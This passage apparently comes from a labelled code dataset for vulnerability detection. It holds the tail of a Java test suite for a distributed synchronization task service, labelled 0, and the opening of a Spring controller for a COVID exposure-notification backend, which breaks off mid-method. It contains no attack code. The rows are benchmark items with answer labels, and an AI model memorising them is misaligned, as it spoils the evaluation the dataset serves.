SynchRetryExampleService.FACTORY_LINK);\n        task.queryResultLimit = this.serviceCount * 4;\n        op = Operation\n                .createPost(UriUtils.buildUri(this.host, SynchronizationTaskService.FACTORY_LINK))\n                .setBody(task);\n\n        result = sender.sendAndWait(op, SynchronizationTaskService.State.class);\n\n        assertEquals(TaskState.TaskStage.FAILED, result.taskInfo.stage);\n        assertEquals(this.serviceCount * 3, result.synchCompletionCount);\n\n        // Verify that this.serviceCount of the child services were failed.\n        waitForSynchRetries(result, SynchronizationTaskService.STAT_NAME_CHILD_SYNCH_FAILURE_COUNT,\n                (synchRetryCount) -> synchRetryCount.latestValue == this.serviceCount);\n\n        waitForSynchRetries(result, SynchronizationTaskService.STAT_NAME_SYNCH_RETRY_COUNT,\n                (synchRetryCount) -> synchRetryCount.latestValue > 0);\n    }\n\n    private void waitForSynchRetries(SynchronizationTaskService.State state, String statName,\n                                     Function<ServiceStats.ServiceStat, Boolean> check) {\n        this.host.waitFor(\"Expected retries not completed\", () -> {\n            URI statsURI = UriUtils.buildStatsUri(this.host, state.documentSelfLink);\n            ServiceStats stats = this.host.getServiceState(null, ServiceStats.class, statsURI);\n            ServiceStats.ServiceStat synchRetryCount = stats.entries\n                    .get(statName);\n\n            return synchRetryCount != null && check.apply(synchRetryCount);\n        });\n    }\n\n    private void createExampleServices(\n            TestRequestSender sender, ServiceHost h, long serviceCount, String selfLinkPostfix, String factoryLink) {\n\n        // create example services\n        List<Operation> ops = new ArrayList<>();\n        for (int i = 0; i < serviceCount; i++) {\n            ServiceDocument initState = new ServiceDocument();\n            initState.documentSelfLink = i + selfLinkPostfix;\n\n            Operation post = Operation.createPost(\n                    UriUtils.buildUri(h, factoryLink)).setBody(initState);\n            ops.add(post);\n        }\n\n        sender.sendAndWait(ops, ServiceDocument.class);\n    }\n\n    @Test\n    public void synchCounts() throws Throwable {\n        synchCountsDo(ExampleService.FACTORY_LINK);\n        synchCountsDo(InMemoryExampleService.FACTORY_LINK);\n    }\n\n    public void synchCountsDo(String factoryLink) throws Throwable {\n        this.host.createExampleServices(this.host, this.serviceCount, null, false, factoryLink);\n        SynchronizationTaskService.State task = createSynchronizationTaskState(Long.MAX_VALUE, factoryLink);\n\n        // Add pagination in query results.\n        task.queryResultLimit = this.serviceCount / 2;\n\n        Operation op = Operation\n                .createPost(UriUtils.buildUri(this.host, SynchronizationTaskService.FACTORY_LINK))\n                .setBody(task);\n\n        TestRequestSender sender = new TestRequestSender(this.host);\n        SynchronizationTaskService.State result = sender\n                .sendAndWait(op, SynchronizationTaskService.State.class);\n\n        assertTrue (result.taskInfo.stage == TaskState.TaskStage.FINISHED);\n        assertTrue (result.synchCompletionCount == this.serviceCount);\n\n        // Restart the task to verify counter was reset.\n        task = createSynchronizationTaskState(Long.MAX_VALUE);\n        task.queryResultLimit = this.serviceCount / 2;\n\n        op = Operation\n                .createPost(UriUtils.buildUri(this.host, SynchronizationTaskService.FACTORY_LINK))\n                .setBody(task);\n        result = sender.sendAndWait(op, SynchronizationTaskService.State.class);\n\n        assertTrue(result.taskInfo.stage == TaskState.TaskStage.FINISHED);\n        assertTrue(result.synchCompletionCount == this.serviceCount);\n    }\n\n    @Test\n    public void synchAfterOwnerRestart() throws Throwable {\n        setUpMultiNode();\n        synchAfterOwnerRestartDo(ExampleService.FACTORY_LINK);\n    }\n\n    @Test\n    public void synchAfterOwnerRestartInMemoryService() throws Throwable {\n        setUpMultiNode();\n        synchAfterOwnerRestartDo(InMemoryExampleService.FACTORY_LINK);\n    }\n\n    @Test\n    public void synchAfterOwnerRestartODLService() throws Throwable {\n        setUpMultiNode();\n        synchAfterOwnerRestartDo(ExampleODLService.FACTORY_LINK);\n    }\n\n    public ExampleServiceState  synchAfterOwnerRestartDo(\n            String factoryLink) throws Throwable {\n        TestRequestSender sender = new TestRequestSender(this.host);\n        this.host.setNodeGroupQuorum(this.nodeCount - 1);\n        this.host.waitForNodeGroupConvergence();\n\n        List<ExampleServiceState> exampleStates = this.host.createExampleServices(\n                this.host.getPeerHost(), this.serviceCount, null, factoryLink);\n\n        Map<String, ExampleServiceState> exampleStatesMap =\n                exampleStates.stream().collect(Collectors.toMap(s -> s.documentSelfLink, s -> s));\n\n        ExampleServiceState state = exampleStatesMap.entrySet().iterator().next().getValue();\n\n        // Find out which is the the owner node and restart it\n        VerificationHost owner = this.host.getInProcessHostMap().values().stream()\n                .filter(host -> host.getId().contentEquals(state.documentOwner)).findFirst()\n                .orElseThrow(() -> new RuntimeException(\"couldn't find owner node\"));\n\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n\n        restartHost(owner);\n\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n\n        // Verify that state was synced with restarted node.\n        Operation op = Operation.createGet(owner, state.documentSelfLink);\n        ExampleServiceState newState = sender.sendAndWait(op, ExampleServiceState.class);\n\n        assertNotNull(newState);\n        return newState;\n    }\n\n    @Test\n    @Ignore\n    public void  synchAfterClusterRestart() throws Throwable {\n        setUpMultiNode();\n        String factoryLink = ExampleService.FACTORY_LINK;\n        this.host.setNodeGroupQuorum(this.nodeCount - 1);\n        this.host.waitForNodeGroupConvergence();\n\n        List<ExampleServiceState> exampleStates = this.host.createExampleServices(\n                this.host.getPeerHost(), this.serviceCount, null, factoryLink);\n\n        Map<String, ExampleServiceState> exampleStatesMap =\n                exampleStates.stream().collect(Collectors.toMap(s -> s.documentSelfLink, s -> s));\n\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n\n        List<VerificationHost> hosts = new ArrayList<>();\n\n        // Stop all nodes and preserve their state.\n        for (Map.Entry<URI, VerificationHost> entry : this.host.getInProcessHostMap().entrySet()) {\n            VerificationHost host = entry.getValue();\n            this.host.stopHostAndPreserveState(host);\n            hosts.add(host);\n        }\n\n        // Create new nodes with same sandbox and port, but different Id.\n        for (VerificationHost host : hosts) {\n            ServiceHost.Arguments args = new ServiceHost.Arguments();\n            args.sandbox = Paths.get(host.getStorageSandbox()).getParent();\n            args.port = 0;\n            VerificationHost newHost = VerificationHost.create(args);\n            newHost.setPort(host.getPort());\n            newHost.start();\n            this.host.addPeerNode(newHost);\n        }\n\n        this.host.joinNodesAndVerifyConvergence(this.nodeCount);\n        this.host.waitForNodeGroupConvergence(this.nodeCount, this.nodeCount);\n\n        // Verify that all states are replicated and synched.\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n\n        // Remove one old node.\n        VerificationHost nodeToStop = this.host.getPeerHost();\n        this.host.stopHost(nodeToStop);\n\n        // Add new node and verify that state is replicated.\n        this.host.setUpLocalPeerHost(nodeToStop.getPort(),\n                VerificationHost.FAST_MAINT_INTERVAL_MILLIS, null, null);\n        this.host.joinNodesAndVerifyConvergence(this.nodeCount);\n        this.host.waitForNodeGroupConvergence(this.nodeCount, this.nodeCount);\n\n        // Verify that all states are replicated and synched.\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n    }\n\n    @Test\n    public void consistentStateAfterOwnerStops() throws Throwable {\n        setUpMultiNode();\n        consistentStateAfterOwnerStop(ExampleService.FACTORY_LINK);\n    }\n\n    @Test\n    public void consistentStateAfterOwnerStopsInMemoryService() throws Throwable {\n        setUpMultiNode();\n        consistentStateAfterOwnerStop(InMemoryExampleService.FACTORY_LINK);\n    }\n\n    @Test\n    @Ignore\n    public void consistentStateAfterOwnerStopsODLService() throws Throwable {\n        setUpMultiNode();\n        consistentStateAfterOwnerStop(ExampleODLService.FACTORY_LINK);\n    }\n\n    public void consistentStateAfterOwnerStop(\n            String factoryLink) throws Throwable {\n        long patchCount = 5;\n        TestRequestSender sender = new TestRequestSender(this.host);\n        this.host.setNodeGroupQuorum(this.nodeCount - 1);\n        this.host.waitForNodeGroupConvergence();\n\n        List<ExampleServiceState> exampleStates = this.host.createExampleServices(\n                this.host.getPeerHost(), this.serviceCount, null, factoryLink);\n\n        Map<String, ExampleServiceState> exampleStatesMap =\n                exampleStates.stream().collect(Collectors.toMap(s -> s.documentSelfLink, s -> s));\n\n        ExampleServiceState state = exampleStatesMap.entrySet().iterator().next().getValue();\n\n        VerificationHost owner = this.host.getInProcessHostMap().values().stream()\n                .filter(host -> host.getId().contentEquals(state.documentOwner)).findFirst()\n                .orElseThrow(() -> new RuntimeException(\"couldn't find owner node\"));\n\n\n        // Send updates to all services and check consistency after owner stops\n        for (ExampleServiceState st : exampleStates) {\n            for (int i = 1; i <= patchCount; i++) {\n                URI serviceUri = UriUtils.buildUri(owner, st.documentSelfLink);\n                ExampleServiceState s = new ExampleServiceState();\n                s.counter = (long) i + st.counter;\n                Operation patch = Operation.createPatch(serviceUri).setBody(s);\n                sender.sendAndWait(patch);\n            }\n        }\n\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount);\n\n        // Stop the current owner and make sure that new owner is selected and state is consistent\n        this.host.stopHost(owner);\n        VerificationHost peer = this.host.getPeerHost();\n\n        this.host.waitForReplicatedFactoryChildServiceConvergence(\n                this.host.getNodeGroupToFactoryMap(factoryLink),\n                exampleStatesMap,\n                this.exampleStateConvergenceChecker,\n                exampleStatesMap.size(),\n                0, this.nodeCount - 1);\n\n        // Verify that state is consistent after original owner node stopped.\n        Operation op = Operation.createGet(peer, state.documentSelfLink);\n        ExampleServiceState newState = sender.sendAndWait(op, ExampleServiceState.class);\n\n        assertNotNull(newState);\n        assertEquals((Long) (state.counter + patchCount), newState.counter);\n        assertNotEquals(newState.documentOwner, state.documentOwner);\n    }\n\n    private VerificationHost restartHost(VerificationHost hostToRestart) throws Throwable {\n        this.host.stopHostAndPreserveState(hostToRestart);\n        this.host.waitForNodeGroupConvergence(this.nodeCount - 1, this.nodeCount - 1);\n\n        hostToRestart.setPort(0);\n        VerificationHost.restartStatefulHost(hostToRestart, false);\n\n        // Start in-memory index service, and in-memory example factory.\n        hostToRestart.addPrivilegedService(InMemoryLuceneDocumentIndexService.class);\n        hostToRestart.startFactory(InMemoryExampleService.class, InMemoryExampleService::createFactory);\n        hostToRestart.startServiceAndWait(InMemoryLuceneDocumentIndexService.class,\n                InMemoryLuceneDocumentIndexService.SELF_LINK);\n\n        hostToRestart.addPrivilegedService(ExampleODLService.class);\n        hostToRestart.startFactory(ExampleODLService.class, ExampleODLService::createFactory);\n\n        this.host.addPeerNode(hostToRestart);\n        this.host.joinNodesAndVerifyConvergence(this.nodeCount);\n        return hostToRestart;\n    }\n\n    @Test\n    public void synchTaskStopsSelfPatchingOnFactoryDelete() throws Throwable {\n        String factoryLink = ExampleService.FACTORY_LINK;\n        this.host.createExampleServices(this.host, this.serviceCount, null, false, factoryLink);\n        SynchronizationTaskService.State task = createSynchronizationTaskState(Long.MAX_VALUE, factoryLink);\n\n        Operation op = Operation\n                .createPost(UriUtils.buildUri(this.host, SynchronizationTaskService.FACTORY_LINK))\n                .setBody(task);\n\n        TestRequestSender sender = new TestRequestSender(this.host);\n        sender.sendRequest(Operation.createDelete(UriUtils.buildUri(this.host, factoryLink)));\n        SynchronizationTaskService.State result = sender.sendAndWait(op, SynchronizationTaskService.State.class);\n\n        // Verify that patch count stops incrementing after a while\n        AtomicInteger previousValue = new AtomicInteger();\n        this.host.waitFor(\"Expected synch task to stop patching itself\", () -> {\n            // Get the latest patch count\n            URI statsURI = UriUtils.buildStatsUri(this.host, result.documentSelfLink);\n            ServiceStats stats = this.host.getServiceState(null, ServiceStats.class, statsURI);\n            ServiceStats.ServiceStat synchRetryCount = stats.entries\n                    .get(STAT_NAME_PATCH_REQUEST_COUNT);\n\n            return previousValue.getAndSet((int)synchRetryCount.latestValue) == synchRetryCount.latestValue;\n        });\n    }\n\n    @Test\n    public void taskRestartability() throws Throwable {\n        // This test verifies that If the synchronization task\n        // is already running and another request arrives, the\n        // task will restart itself if the request had a higher\n        // membershipUpdateTime.\n        URI taskFactoryUri = UriUtils.buildUri(\n                this.host.getUri(), SynchronizationTaskService.FACTORY_LINK);\n        URI taskUri = UriUtils.extendUri(\n                taskFactoryUri, UriUtils.convertPathCharsFromLink(ExampleService.FACTORY_LINK));\n\n        SynchronizationTaskService.State task = this.host.getServiceState(\n                null, SynchronizationTaskService.State.class, taskUri);\n        assertTrue(task.taskInfo.stage == TaskState.TaskStage.FINISHED);\n\n        long membershipUpdateTimeMicros = task.membershipUpdateTimeMicros;\n\n        List<Operation> ops = new ArrayList<>();\n        for (int i = 0; i < this.updateCount; i++) {\n            membershipUpdateTimeMicros += 1;\n            SynchronizationTaskService.State state =\n                    createSynchronizationTaskState(membershipUpdateTimeMicros);\n            Operation op = Operation\n                    .createPost(taskFactoryUri)\n                    .setBody(state)\n                    .setReferer(this.host.getUri());\n            ops.add(op);\n        }\n\n        TestRequestSender sender = new TestRequestSender(this.host);\n        List<Operation> responses = sender.sendAndWait(ops, false);\n\n        for (Operation o : responses) {\n            if (o.getStatusCode() == Operation.STATUS_CODE_OK) {\n                SynchronizationTaskService.State r = o.getBody(\n                        SynchronizationTaskService.State.class);\n                assertTrue(r.taskInfo.stage == TaskState.TaskStage.FINISHED);\n            } else if (o.getStatusCode() == Operation.STATUS_CODE_BAD_REQUEST) {\n                ServiceErrorResponse r = o.getBody(ServiceErrorResponse.class);\n                assertTrue(r.getErrorCode() == ServiceErrorResponse.ERROR_CODE_OUTDATED_SYNCH_REQUEST);\n            } else {\n                throw new IllegalStateException(\"Unexpected operation response: \"\n                        + o.getStatusCode());\n            }\n        }\n\n        final long updateTime = membershipUpdateTimeMicros;\n        this.host.waitFor(\"membershipUpdateTimeMicros was not set correctly\", () -> {\n            SynchronizationTaskService.State t = this.host.getServiceState(\n                    null, SynchronizationTaskService.State.class, taskUri);\n            return t.membershipUpdateTimeMicros == updateTime;\n        });\n    }\n\n    @Test\n    public void outdatedSynchronizationRequests() throws Throwable {\n        // This test verifies that the synch task will only get\n        // restarted if the synch time is new. For requests with\n        // older time-stamps, the synch task ignores the request.\n\n        URI taskFactoryUri = UriUtils.buildUri(\n                this.host.getUri(), SynchronizationTaskService.FACTORY_LINK);\n        URI taskUri = UriUtils.extendUri(\n                taskFactoryUri, UriUtils.convertPathCharsFromLink(ExampleService.FACTORY_LINK));\n\n        SynchronizationTaskService.State task = this.host.getServiceState(\n                null, SynchronizationTaskService.State.class, taskUri);\n        assertTrue(task.taskInfo.stage == TaskState.TaskStage.FINISHED);\n\n        List<Operation> ops = new ArrayList<>();\n        long membershipUpdateTimeMicros = task.membershipUpdateTimeMicros;\n\n        for (int i = 0; i < 10; i++) {\n            membershipUpdateTimeMicros -= 1;\n            SynchronizationTaskService.State state =\n                    createSynchronizationTaskState(membershipUpdateTimeMicros);\n            Operation op = Operation\n                    .createPost(taskFactoryUri)\n                    .setBody(state)\n                    .setReferer(this.host.getUri());\n            ops.add(op);\n        }\n\n        TestRequestSender sender = new TestRequestSender(this.host);\n        List<Operation> results = sender.sendAndWait(ops, false);\n\n        for (Operation op : results) {\n            assertTrue(op.getStatusCode() == Operation.STATUS_CODE_BAD_REQUEST);\n            ServiceErrorResponse body = op.getBody(ServiceErrorResponse.class);\n            assertTrue(body.getErrorCode() == ServiceErrorResponse.ERROR_CODE_OUTDATED_SYNCH_REQUEST);\n        }\n    }\n\n    @Test\n    public void stateValidation() throws Throwable {\n        // This test verifies state validation when\n        // a synchronization task is created.\n\n        // handleStart validation.\n        URI taskFactoryUri = UriUtils.buildUri(\n                this.host.getUri(), SynchronizationTaskService.FACTORY_LINK);\n\n        validateInvalidStartState(taskFactoryUri, true, s -> s.factorySelfLink = null);\n        validateInvalidStartState(taskFactoryUri, true, s -> s.factoryStateKind = null);\n        validateInvalidStartState(taskFactoryUri, true, s -> s.nodeSelectorLink = null);\n        validateInvalidStartState(taskFactoryUri, true, s -> s.queryResultLimit = -1);\n        validateInvalidStartState(taskFactoryUri, true, s -> s.membershipUpdateTimeMicros = 10L);\n        validateInvalidStartState(taskFactoryUri, true, s -> s.queryPageReference = taskFactoryUri);\n        validateInvalidStartState(taskFactoryUri, true,\n                s -> s.subStage = SynchronizationTaskService.SubStage.SYNCHRONIZE);\n        validateInvalidStartState(taskFactoryUri, true,\n                s -> s.childOptions = EnumSet.of(Service.ServiceOption.PERSISTENCE));\n        validateInvalidStartState(taskFactoryUri, true,\n                s -> {\n                    s.taskInfo = new TaskState();\n                    s.taskInfo.stage = TaskState.TaskStage.STARTED;\n                });\n\n        // handlePut validation\n        validateInvalidPutRequest(taskFactoryUri, true, s -> s.queryResultLimit = -1);\n        validateInvalidPutRequest(taskFactoryUri, true, s -> s.membershipUpdateTimeMicros = null);\n        validateInvalidPutRequest(taskFactoryUri, true, s -> s.membershipUpdateTimeMicros = 0L);\n\n        // Let's also test successful requests, to make sure our\n        // test methods are doing the right thing.\n        validateInvalidStartState(taskFactoryUri, false, null);\n        validateInvalidPutRequest(taskFactoryUri, false, null);\n    }\n\n    private long getLatestMembershipUpdateTime(URI nodeUri) throws Throwable {\n        NodeGroupService.NodeGroupState ngs = this.host.getServiceState(null,\n                NodeGroupService.NodeGroupState.class,\n                UriUtils.buildUri(nodeUri, ServiceUriPaths.DEFAULT_NODE_GROUP));\n        return ngs.membershipUpdateTimeMicros;\n    }\n\n    private SynchronizationTaskService.State createSynchronizationTaskState(\n            Long membershipUpdateTimeMicros) {\n        return createSynchronizationTaskState(\n                membershipUpdateTimeMicros, ExampleService.FACTORY_LINK, ExampleService.ExampleServiceState.class);\n    }\n\n    private SynchronizationTaskService.State createSynchronizationTaskState(\n            Long membershipUpdateTimeMicros, String factoryLink) {\n        return createSynchronizationTaskState(\n                membershipUpdateTimeMicros, factoryLink, ExampleService.ExampleServiceState.class);\n    }\n\n    private SynchronizationTaskService.State createSynchronizationTaskState(\n            Long membershipUpdateTimeMicros, String factoryLink, Class<? extends ServiceDocument> type) {\n        SynchronizationTaskService.State task = new SynchronizationTaskService.State();\n        task.documentSelfLink = UriUtils.convertPathCharsFromLink(factoryLink);\n        task.factorySelfLink = factoryLink;\n        task.factoryStateKind = Utils.buildKind(type);\n        task.membershipUpdateTimeMicros = membershipUpdateTimeMicros;\n        task.nodeSelectorLink = ServiceUriPaths.DEFAULT_NODE_SELECTOR;\n        task.queryResultLimit = 1000;\n        task.taskInfo = TaskState.create();\n        task.taskInfo.isDirect = true;\n\n        return task;\n    }\n\n    private void validateInvalidStartState(URI taskFactoryUri,\n            boolean expectFailure, Consumer<SynchronizationTaskService.State> stateSetter)\n    throws Throwable {\n        String factorySelfLink = UUID.randomUUID().toString();\n        URI taskUri = UriUtils.extendUri(\n                taskFactoryUri, UriUtils.convertPathCharsFromLink(factorySelfLink));\n\n        SynchronizationTaskService.State task = createSynchronizationTaskState(null);\n        task.factorySelfLink = factorySelfLink;\n        task.documentSelfLink = factorySelfLink;\n\n        if (stateSetter != null) {\n            stateSetter.accept(task);\n        }\n\n        TestContext ctx = testCreate(1);\n        Operation post = Operation\n                .createPost(taskUri)\n                .setBody(task)\n                .setCompletion((o, e) -> {\n                    if (expectFailure) {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_BAD_REQUEST) {\n                            ctx.completeIteration();\n                            return;\n                        }\n                        ctx.failIteration(new IllegalStateException(\n                                \"request was expected to fail\"));\n                    } else {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_ACCEPTED) {\n                            ctx.completeIteration();\n                            return;\n                        }\n                        ctx.failIteration(new IllegalStateException(\n                                \"request was expected to succeed\"));\n                    }\n                });\n\n        SynchronizationTaskService service = SynchronizationTaskService\n                .create(() -> new ExampleService());\n        this.host.startService(post, service);\n        testWait(ctx);\n    }\n\n    private void validateInvalidPutRequest(URI taskFactoryUri,\n            boolean expectFailure, Consumer<SynchronizationTaskService.State> stateSetter)\n            throws Throwable {\n        SynchronizationTaskService.State state =\n                createSynchronizationTaskState(Long.MAX_VALUE);\n\n        if (stateSetter != null) {\n            stateSetter.accept(state);\n        }\n\n        TestContext ctx = testCreate(1);\n        Operation op = Operation\n                .createPost(taskFactoryUri)\n                .setBody(state)\n                .setReferer(this.host.getUri())\n                .setCompletion((o, e) -> {\n                    if (expectFailure) {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_BAD_REQUEST) {\n                            ctx.completeIteration();\n                            return;\n                        }\n                        ctx.failIteration(new IllegalStateException(\n                                \"request was expected to fail\"));\n                    } else {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_OK) {\n                            ctx.completeIteration();\n                            return;\n                        }\n                        ctx.failIteration(new IllegalStateException(\n                                \"request was expected to succeed\"));\n                    }\n                });\n        this.host.sendRequest(op);\n        testWait(ctx);\n    }\n}\n", "target": 0}
{"idx": 1080, "func": "/*\n * Copyright (c) 2020 Ubique Innovation AG <https://www.ubique.ch>\n *\n * This Source Code Form is subject to the terms of the Mozilla Public\n * License, v. 2.0. If a copy of the MPL was not distributed with this\n * file, You can obtain one at https://mozilla.org/MPL/2.0/.\n *\n * SPDX-License-Identifier: MPL-2.0\n */\npackage org.dpppt.backend.sdk.ws.controller;\n\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport io.jsonwebtoken.Jwts;\nimport io.swagger.v3.oas.annotations.Operation;\nimport io.swagger.v3.oas.annotations.Parameter;\nimport io.swagger.v3.oas.annotations.responses.ApiResponse;\nimport io.swagger.v3.oas.annotations.responses.ApiResponses;\nimport io.swagger.v3.oas.annotations.tags.Tag;\nimport org.dpppt.backend.sdk.data.gaen.FakeKeyService;\nimport org.dpppt.backend.sdk.data.gaen.GAENDataService;\nimport org.dpppt.backend.sdk.model.gaen.*;\nimport org.dpppt.backend.sdk.ws.radarcovid.annotation.Loggable;\nimport org.dpppt.backend.sdk.ws.security.ValidateRequest;\nimport org.dpppt.backend.sdk.ws.security.ValidateRequest.InvalidDateException;\nimport org.dpppt.backend.sdk.ws.security.signature.ProtoSignature;\nimport org.dpppt.backend.sdk.ws.security.signature.ProtoSignature.ProtoSignatureWrapper;\nimport org.dpppt.backend.sdk.ws.util.ValidationUtils;\nimport org.dpppt.backend.sdk.ws.util.ValidationUtils.BadBatchReleaseTimeException;\nimport org.joda.time.DateTime;\nimport org.joda.time.DateTimeZone;\nimport org.joda.time.format.DateTimeFormat;\nimport org.joda.time.format.DateTimeFormatter;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.security.core.annotation.AuthenticationPrincipal;\nimport org.springframework.security.oauth2.jwt.Jwt;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.transaction.annotation.Transactional;\nimport org.springframework.web.bind.MethodArgumentNotValidException;\nimport org.springframework.web.bind.annotation.*;\n\nimport javax.validation.Valid;\nimport java.io.IOException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.PrivateKey;\nimport java.security.SignatureException;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.time.LocalDate;\nimport java.time.ZoneOffset;\nimport java.time.format.DateTimeParseException;\nimport java.util.*;\nimport java.util.concurrent.Callable;\n\n@Controller\n@RequestMapping(\"/v1/gaen\")\n@Tag(name = \"GAEN\", description = \"The GAEN endpoint for the mobile clients\")\n/**\n * The GaenController defines the API endpoints for the mobile clients to access the GAEN functionality of the\n * red backend.\n * Clients can send new Exposed Keys, or request the existing Exposed Keys.\n */\npublic class GaenController {\n\tprivate static final Logger logger = LoggerFactory.getLogger(GaenController.class);\n\tprivate static final String FAKE_CODE = \"112358132134\";\n\n    private static final DateTimeFormatter RFC1123_DATE_TIME_FORMATTER =\n            DateTimeFormat.forPattern(\"EEE, dd MMM yyyy HH:mm:ss 'GMT'\")\n                    .withZoneUTC().withLocale(Locale.ENGLISH);\n\n\t// releaseBucketDuration is used to delay the publishing of Exposed Keys by splitting the database up into batches of keys\n\t// in releaseBucketDuration duration. The current batch is never published, only previous batches are published.\n\tprivate final Duration releaseBucketDuration;\n\n\tprivate final Duration requestTime;\n\tprivate final ValidateRequest validateRequest;\n\tprivate final ValidationUtils validationUtils;\n\tprivate final GAENDataService dataService;\n\tprivate final FakeKeyService fakeKeyService;\n\tprivate final Duration exposedListCacheControl;\n\tprivate final PrivateKey secondDayKey;\n\tprivate final ProtoSignature gaenSigner;\n\n\tpublic GaenController(GAENDataService dataService, FakeKeyService fakeKeyService, ValidateRequest validateRequest,\n\t\t\t\t\t\t  ProtoSignature gaenSigner, ValidationUtils validationUtils, Duration releaseBucketDuration, Duration requestTime,\n\t\t\t\t\t\t  Duration exposedListCacheControl, PrivateKey secondDayKey) {\n\t\tthis.dataService = dataService;\n\t\tthis.fakeKeyService = fakeKeyService;\n\t\tthis.releaseBucketDuration = releaseBucketDuration;\n\t\tthis.validateRequest = validateRequest;\n\t\tthis.requestTime = requestTime;\n\t\tthis.validationUtils = validationUtils;\n\t\tthis.exposedListCacheControl = exposedListCacheControl;\n\t\tthis.secondDayKey = secondDayKey;\n\t\tthis.gaenSigner = gaenSigner;\n\t}\n\n\t@PostMapping(value = \"/exposed\")\n\t@Loggable\n\t@Transactional\n\t@Operation(description = \"Send exposed keys to server - includes a fix for the fact that GAEN doesn't give access to the current day's exposed key\")\n\t@ApiResponses(value = {\n\t\t\t@ApiResponse(responseCode = \"200\", description = \"The exposed keys have been stored in the database\"),\n\t\t\t@ApiResponse(responseCode = \"400\", description = \n\t\t\t\t\t\"- Invalid base64 encoding in GaenRequest\" +\n                    \"- negative rolling period\" +\n                    \"- fake claim with non-fake keys\"),\n\t\t\t@ApiResponse(responseCode = \"403\", description = \"Authentication failed\") })\n\tpublic @ResponseBody Callable<ResponseEntity<String>> addExposed(\n\t\t\t@Valid @RequestBody @Parameter(description = \"The GaenRequest contains the SecretKey from the guessed infection date, the infection date itself, and some authentication data to verify the test result\") GaenRequest gaenRequest,\n\t\t\t@RequestHeader(value = \"User-Agent\") @Parameter(description = \"App Identifier (PackageName/BundleIdentifier) + App-Version + OS (Android/iOS) + OS-Version\", example = \"ch.ubique.android.starsdk;1.0;iOS;13.3\") String userAgent,\n\t\t\t@AuthenticationPrincipal @Parameter(description = \"JWT token that can be verified by the backend server\") Object principal) {\n\t\tvar now = Instant.now().toEpochMilli();\n\t\tif (!this.validateRequest.isValid(principal)) {\n\t\t\treturn () -> ResponseEntity.status(HttpStatus.FORBIDDEN).build();\n\t\t}\n\n\t\tList<GaenKey> nonFakeKeys = new ArrayList<>();\n\t\tfor (var key : gaenRequest.getGaenKeys()) {\n\t\t\tif (!validationUtils.isValidBase64Key(key.getKeyData())) {\n\t\t\t\treturn () -> new ResponseEntity<>(\"No valid base64 key\", HttpStatus.BAD_REQUEST);\n\t\t\t}\n\t\t\tif (this.validateRequest.isFakeRequest(principal, key) \n\t\t\t\t|| hasNegativeRollingPeriod(key)\n\t\t\t\t|| hasInvalidKeyDate(principal, key)) {\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (key.getRollingPeriod().equals(0)) {\n\t\t\t\t//currently only android seems to send 0 which can never be valid, since a non used key should not be submitted\n\t\t\t\t//default value according to EN is 144, so just set it to that. If we ever get 0 from iOS we should log it, since\n\t\t\t\t//this should not happen\n\t\t\t\tkey.setRollingPeriod(GaenKey.GaenKeyDefaultRollingPeriod);\n\t\t\t\tif (userAgent.toLowerCase().contains(\"ios\")) {\n\t\t\t\t\tlogger.error(\"Received a rolling period of 0 for an iOS User-Agent\");\n\t\t\t\t}\n\t\t\t}\n\t\t\tnonFakeKeys.add(key);\n\t\t}\n\n\t\tif (principal instanceof Jwt && ((Jwt) principal).containsClaim(\"fake\")\n\t\t\t\t&& ((Jwt) principal).getClaimAsString(\"fake\").equals(\"1\")) {\n\t\t\tJwt token = (Jwt) principal;\n\t\t\tif (FAKE_CODE.equals(token.getSubject())) {\n\t\t\t\tlogger.info(\"Claim is fake - subject: {}\", token.getSubject());\n\t\t\t} else if (!nonFakeKeys.isEmpty()) {\n\t\t\t\treturn () -> ResponseEntity.badRequest().body(\"Claim is fake but list contains non fake keys\");\n\t\t\t}\n\t\t}\n\n\t\tif (!nonFakeKeys.isEmpty()) {\n\t\t\tdataService.upsertExposees(nonFakeKeys);\n\t\t}\n\n\t\tvar delayedKeyDateDuration = Duration.of(gaenRequest.getDelayedKeyDate(), GaenUnit.TenMinutes);\n\t\tvar delayedKeyDate = LocalDate.ofInstant(Instant.ofEpochMilli(delayedKeyDateDuration.toMillis()),\n\t\t\t\tZoneOffset.UTC);\n\n\t\tvar nowDay = LocalDate.now(ZoneOffset.UTC);\n\t\tif (delayedKeyDate.isBefore(nowDay.minusDays(1)) || delayedKeyDate.isAfter(nowDay.plusDays(1))) {\n\t\t\treturn () -> ResponseEntity.badRequest().body(\"delayedKeyDate date must be between yesterday and tomorrow\");\n\t\t}\n\n\t\tvar responseBuilder = ResponseEntity.ok();\n\t\tif (principal 